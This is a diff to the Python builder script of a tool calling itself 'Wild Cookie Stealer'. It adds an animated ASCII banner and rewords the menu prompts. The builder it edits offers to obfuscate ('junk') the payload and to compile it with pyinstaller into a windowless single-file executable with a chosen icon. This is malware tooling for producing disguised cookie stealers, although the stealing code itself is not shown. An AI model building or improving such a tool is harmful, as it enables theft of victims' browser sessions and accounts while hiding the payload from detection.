@@ -7,6 +7,33 @@ from tkinter import filedialog, Tk
 
 os.system('clear' if os.name == 'posix' else 'cls')
 
+intro = """
+                                                              
+                      ▒▒██▓▓  ░░░░░░░░░░░░████░░                    
+                    ▒▒▒▒▒▒▓▓██▓▓▓▓▓▓▓▓████▓▓▒▒▓▓░░                  
+                  ▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▓▓░░                
+                  ██▒▒▓▓▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒░░                
+                  ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██▒▒▒▒                
+                  ░░▓▓▓▓▒▒▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒██▓▓░░                
+                  ██▒▒▓▓▒▒▒▒▒▒    ░░▒▒    ▒▒▒▒██▒▒▒▒                
+                ▒▒▒▒▒▒▓▓▓▓▒▒░░░░      ▓▓    ▒▒▒▒▒▒▓▓                
+                ▒▒▒▒▒▒▒▒▓▓░░░░░░      ▓▓  ░░▓▓▒▒▒▒▓▓      Wild Cookie Stealer - o_0
+                  ▓▓▒▒▒▒▒▒▓▓          ░░  ▓▓▒▒▒▒▒▒▒▒                
+                    ██▒▒▓▓  ██████░░██████░░▓▓▒▒▓▓                  
+                    ██▒▒██    ▓▓▓▓▓▓██▒▒  ░░▓▓▒▒▓▓                  
+                    ░░▓▓▓▓▒▒░░▒▒▒▒▓▓░░▓▓  ▓▓▒▒██░░                  
+                      ▒▒▓▓██░░██▓▓██████  ▓▓▓▓                      
+                      ▓▓▓▓    ▒▒▓▓▓▓▓▓    ░░▓▓▓▓                    
+                      ░░                    ░░                      
+                                                                                              
+
+
+"""
+
+Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)
+
+
+
 print(f"""{Fore.LIGHTRED_EX}
                                                               
                       ▒▒██▓▓  ░░░░░░░░░░░░████░░                    
@@ -33,7 +60,7 @@ time.sleep(1)
 
 
 while True:
-    Write.Print("\nWhat do you want to choice ", Colors.purple_to_yellow)
+    Write.Print("\nWhat do you want to choice | 1/2", Colors.purple_to_yellow)
     Write.Print("\n1. Build an executable", Colors.purple_to_yellow)
     Write.Print("\n2. Close", Colors.purple_to_yellow)
     Write.Print("\nselect: ", Colors.purple_to_yellow, end="")
@@ -54,7 +81,7 @@ while True:
 
         obfuscate = False
         while True:
-            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
+            answer = input(Fore.CYAN + "\nDo you want to junk your code? | (Y/N) " + Style.RESET_ALL)
             if answer.upper() == "Y":
                 os.system("python junk.py")
                 Write.Print(f"\n{filename} The file has been junked.", Colors.purple_to_yellow)
@@ -62,11 +89,11 @@ while True:
             elif answer.upper() == "N":
                 break
             else:
-                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+                Write.Print("\nYou have entered invalid. Please try again.", Colors.purple_to_yellow)
 
-        answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
+        answer = input(Fore.CYAN + "\nDo you want to make exe file? | (Y/N) " + Style.RESET_ALL)
         if answer.upper() == "Y":
-            answer = input(Fore.CYAN + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
+            answer = input(Fore.CYAN + "\nDo you want to add an icon? | (Y/N) " + Style.RESET_ALL)
             if answer.upper() == "Y":
                 Tk().withdraw()  
                 icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
@@ -74,7 +101,7 @@ while True:
                     subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                     Write.Print(f"\n{filename} has been converted to exe with the selected icon.", Colors.purple_to_yellow)
                 else:
-                    Write.Print("\nThe file you choose must have .ico extension!", Colors.red_to_purple)
+                    Write.Print("\nThe file you choose must have .ico extension!", Colors.purple_to_yellow)
             else:
                 subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                 Write.Print(f"\n{filename} The file has been converted to exe.", Colors.purple_to_yellow)
@@ -84,4 +111,4 @@ while True:
         break
 
     else:
-        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+        Write.Print("\nWhoops! Something went wrong... 0_o", Colors.purple_to_yellow)
